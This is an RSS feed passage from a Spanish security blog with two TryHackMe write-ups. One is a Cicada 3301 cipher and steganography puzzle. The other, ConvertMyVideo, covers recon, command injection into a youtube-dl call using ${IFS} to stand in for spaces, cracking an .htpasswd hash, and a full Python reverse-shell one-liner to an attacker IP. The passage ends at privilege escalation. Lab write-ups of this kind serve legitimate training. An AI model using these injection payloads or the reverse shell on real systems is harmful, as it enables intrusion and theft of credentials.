&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/Cryillic&#34;&gt;Cryillic&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;analyze-the-audio&#34;&gt;Analyze The Audio&lt;/h2&gt;
&lt;p&gt;Al inicio tenemos un archivo de audio (&lt;code&gt;3301.wav&lt;/code&gt;) al cual le añadimos una capa de espectrograma utilizando &lt;a href=&#34;https://www.sonicvisualiser.org/&#34;&gt;&lt;strong&gt;Sonic Visualiser&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_005214.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos devuelve una imagen QR el cual obtuvimos una URL utilizando el &lt;a href=&#34;https://online-barcode-reader.inliteresearch.com/&#34;&gt;&lt;em&gt;Lector QR inlite&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_205257.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;decode-the-passphrase&#34;&gt;Decode the Passphrase&lt;/h2&gt;
&lt;p&gt;Una URL hacia Pastebin.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_005331.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_005505.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para poder decodificar la frase y la clave en &lt;code&gt;base64&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_005555.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;Vigenere&lt;/code&gt; para poder codificar nuevamente (como el reto lo indica) con la clave que encontramos a la frase decodificada.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_005730.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gather-metadata&#34;&gt;Gather Metadata&lt;/h2&gt;
&lt;p&gt;Utilizamos la frase que codificamos para extraer el archivo dentro de la imagen &lt;code&gt;welcome.jpg&lt;/code&gt;, y nos da una url de una image.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_211318.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;La imagen de la URL.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_211512.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;find-hidden-files&#34;&gt;Find Hidden Files&lt;/h2&gt;
&lt;p&gt;En este Task intentamos con muchas &lt;a href=&#34;https://github.com/DominicBreuker/stego-toolkit&#34;&gt;&lt;strong&gt;herramientas de esteganografia&lt;/strong&gt;&lt;/a&gt; y encontramos la correcta, Outguess para poder obtener la informacion (archivo) dentro de la imagen.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_213432.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el mensaje nos indica que debemos de romper el hash para poder encontrar el libro.Tambien una combinacion de letras y numeros y que debemos de ir hacia delante si el numero es positivo, y hacia atras si el numero es negativo.&lt;/p&gt;
&lt;p&gt;El hash:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;b6atryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackmetryhackme348
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Verificamos que tipo de hash es y vemos que es &lt;code&gt;SHA2-512&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_213930.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;a href=&#34;https://md5hashing.net&#34;&gt;https://md5hashing.net&lt;/a&gt; para poder obtener el texto el cual es una URL a pastebin.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200506_214534.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;book-cipher&#34;&gt;Book Cipher&lt;/h2&gt;
&lt;p&gt;La URL de pastebin contiene lo que parece ser el capitulo de un libro.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_000733.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Recordemos el nombre del challenge &lt;code&gt;Cicada 3301&lt;/code&gt;, investigamos acerca del reto, especificamente de la solucion, y encontramos que el reto se parece bastante a &lt;a href=&#34;https://the-cicada-puzzles.fandom.com/wiki/2014_Recruitment_Puzzle&#34;&gt;&lt;code&gt;Cicada 3301 - The Book Cipher&lt;/code&gt;&lt;/a&gt;, por lo que utilizamos el ejemplo para obtener la URL para el &lt;code&gt;Task 7&lt;/code&gt;, para ello escribimos un pequeño script en python al cual le pasamos la linea del libro y el numero de letra que debe extraer, omitimos la primera letra ya que hace referencia al &lt;code&gt;Capitulo I&lt;/code&gt; (es el que tenemos).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_001844.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hay que mencionar que este tipo de cifrado para resolverlo se puede utilizar la sintaxis siguiente (&lt;code&gt;par1:par2:par3&lt;/code&gt;), pueden ser &lt;strong&gt;numeros de pagina, linea, palabra o letra&lt;/strong&gt;, para este reto era sencillo: &lt;strong&gt;linea:letra&lt;/strong&gt; y omitimos los espacios ya que devuelve un valor distinto.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_002442.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien, este cifrado para resolverlo comenzamos desde la primera letra de la Oracion y no de la linea, en el caso de los numeros negativos vamos hacia atras de la oracion como nos indicaba el mensaje.&lt;/p&gt;
&lt;details&gt;
    &lt;summary&gt;Spoiler&lt;/summary&gt; 
    El script: [**Script.py**](https://github.com/sckull/ctf-stuff/tree/master/tryhackme/cicada3301_vol1)
&lt;/details&gt;
&lt;p&gt;Al resolverlo por completo nos devuelve una URL acortada que nos redirige a soundcloud.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_004724.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;the-final-song&#34;&gt;The Final Song&lt;/h2&gt;
&lt;p&gt;Ingresar el Nombre de la Cancion encontrada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/cicada3301vol1/Screenshot_20200507_014020.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/cicada3301vol1/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/cicada3301vol1/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>challenge</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - ConvertMyVideo</title>
        <link>https://sckull.github.io/posts/convertmyvideo/</link>
        <pubDate>Tue, 05 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 05 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/convertmyvideo/</guid>
        <description>ConvertMyVideo es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;ConvertMyVideo es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;ConvertMyVideo&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;My Script to convert videos to MP3 is super secure&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;320&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/overjt&#34;&gt;overjt&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue May  5 19:02:47 2020 as: nmap -sV -o nmap_scan_mini convertmyvideo.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; convertmyvideo.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.1.154&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue May  5 19:03:30 2020 -- 1 IP address (1 host up) scanned in 43.02 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina sencilla en el puerto 80, en la que nos muestra un formulario en donde nos pide un ID de un video de YouTube.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_185935.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/convertmyvideo# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://convertmyvideo.thm/ -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/admin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 401&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/tmp &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro del codigo fuente de la pagina encontramos el codigo de envio del ID en Javascript, el cual envia la URL de youtube añadiendole el ID.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_191521.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos Burpsuite para capturar el envio de el ID, le agregamos un ID erroneo y nos da una respuesta en el que nos devuelve el error que se generó.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_191641.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;command-injection&#34;&gt;COMMAND INJECTION&lt;/h2&gt;
&lt;p&gt;Eliminamos la URL y enviamos algo diferente, y vemos que el mensaje de error contiene el nombre de una herramienta que se utiliza para descargar videos de YouTube - youtube-dl.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_191917.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para verificar que esa herramienta esta siendo utilizada con la pagina, enviamos la flag &lt;code&gt;--help&lt;/code&gt; para confirmar que es esa herramienta, y nos devolvió todas las opciones.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_192145.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al parecer la pagina esta utilizando youtube-dl para pasarle la url con el ID que ingresamos, mediante la ejecucion de la herramienta a traves de consola. Intentamos romper este comando y sus parametros, utilizamos &lt;a href=&#34;https://owasp.org/www-community/attacks/Command_Injection&#34;&gt;&lt;strong&gt;command injection&lt;/strong&gt;&lt;/a&gt;, con &lt;code&gt;|&lt;/code&gt; y el comando &lt;code&gt;id&lt;/code&gt; más el separador &lt;code&gt;;&lt;/code&gt; (punto y coma) esto para separar y no ejecutar los parametros adicionales. Logramos ejecutar el comando.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_205754.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que podemos ejecutar comandos, comenzamos a enumerar los archivos que estan en la maquina, vemos que la direccion donde estamos es en &lt;code&gt;/var/www/html&lt;/code&gt; y los archivos que se encuentran en esa direccion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_211638.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener el codigo fuente de index.php utilizando &lt;code&gt;cat{$IFS}index.php&lt;/code&gt; (utilizamos &lt;code&gt;{$IFS}&lt;/code&gt; para agregar espacios).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_211743.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos en el codigo fuente que ejecuta el comando youtube-dl con sus parametros y en medio pasa la URL que es ingresada por el usuario.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_212232.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos la carpeta de admin, la cual contiene un &lt;code&gt;index.php&lt;/code&gt; y &lt;code&gt;flag.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_212555.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Intentamos realizar cat a la &lt;strong&gt;flag.txt&lt;/strong&gt; y obtenemos la primera.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_213821.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Enumeramos la carpeta nuevamente con mas profundidad y econtramos el archivo &lt;code&gt;.htaccess&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_213123.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Ejecucion de Comando&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;total &lt;span class=&#34;m&#34;&gt;36&lt;/span&gt;
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; www-data www-data &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; 04:42 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root     root     &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; 01:07 ..
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; www-data www-data  &lt;span class=&#34;m&#34;&gt;152&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; 03:58 .htaccess
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data www-data &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; 05:05 admin
drwxrwxr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data www-data &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; 04:26 images
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; www-data www-data &lt;span class=&#34;m&#34;&gt;1790&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; 04:55 index.php
drwxrwxr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data www-data &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; 04:44 js
-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; www-data www-data  &lt;span class=&#34;m&#34;&gt;205&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; 04:40 style.css
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; www-data www-data &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt; 05:13 tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El archivo contiene lo siguiente y al parecer hay un archivo &lt;code&gt;.htpasswd&lt;/code&gt; en la carpeta &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;lt;Files /admin/.htpasswd&amp;gt;
Order allow,deny
Deny from all
&amp;lt;/Files&amp;gt;

&amp;lt;Files /admin/.htaccess&amp;gt;
Order allow,deny
Deny from all
&amp;lt;/Files&amp;gt;
 
Options -Indexes
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Hacemos cat al archivo y logramos obtener un usuario y contraseña encriptada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_213751.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos john para obtener la contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_214203.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ingresamos a la pagina utilizando el panel de &lt;code&gt;/admin&lt;/code&gt; y vemos un boton que al presionarlo realiza la ejecucion de un comando.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_214331.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que podemos ejecutar comandos:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_214431.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---www-data&#34;&gt;USER - WWW-DATA&lt;/h2&gt;
&lt;p&gt;Utilizamos python para ejecutar nuestra shell inversa y ponemos a la escucha nuestro netcat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.18.1.160&amp;#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener una shell con usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_215113.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Mediante una enumeracion basica de binarios no encontramos alguno que nos puediera ayudar, utilizamos &lt;code&gt;pspy&lt;/code&gt; para ver si existe algun cronjob en la maquina. Encontramos que se ejecuta un cronjob el cual ejecuta el archivo &lt;code&gt;clean.sh&lt;/code&gt; que se encuentra en &lt;code&gt;/var/www/html/tmp/&lt;/code&gt;.&lt;/p&gt;
